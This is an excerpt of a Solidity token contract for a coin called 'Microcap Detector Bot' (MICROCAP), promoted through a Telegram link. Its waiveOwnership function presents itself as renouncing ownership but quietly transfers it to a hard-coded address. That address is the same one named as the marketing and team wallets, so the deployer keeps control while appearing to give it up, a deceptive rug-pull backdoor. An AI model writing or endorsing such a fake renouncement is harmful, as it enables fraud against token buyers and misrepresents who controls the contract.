...
/**
Telegram : https://t.me/microcapbot
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x60075fBe4C91cF3454e161e45e05aD870EBA54D4);
    }
...
contract MicrocapDetectorBot is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Microcap Detector Bot";
    string private _symbol = "MICROCAP";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x60075fBe4C91cF3454e161e45e05aD870EBA54D4);
    address payable public teamWalletAddress = payable(0x60075fBe4C91cF3454e161e45e05aD870EBA54D4);
